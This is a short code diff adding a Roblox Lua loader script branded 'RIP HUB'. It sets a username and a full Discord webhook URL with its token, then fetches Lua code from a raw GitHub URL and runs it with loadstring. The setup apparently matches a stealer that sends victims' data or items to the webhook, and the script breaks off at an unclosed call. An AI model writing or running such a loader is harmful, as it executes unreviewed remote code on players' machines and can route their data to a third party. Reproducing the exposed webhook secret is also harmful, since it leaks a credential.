@@ -1,0 +1,5 @@
+_G.Username = "godvote"
+_G.HubName = "RIP HUB"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1097664754945904831/M4fPTE1mP3PReGebPFhEK_0y3FU2m5lVFPBOhuVc3oTXuurVrMXwvR1koe0GfN6DisI6"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))(
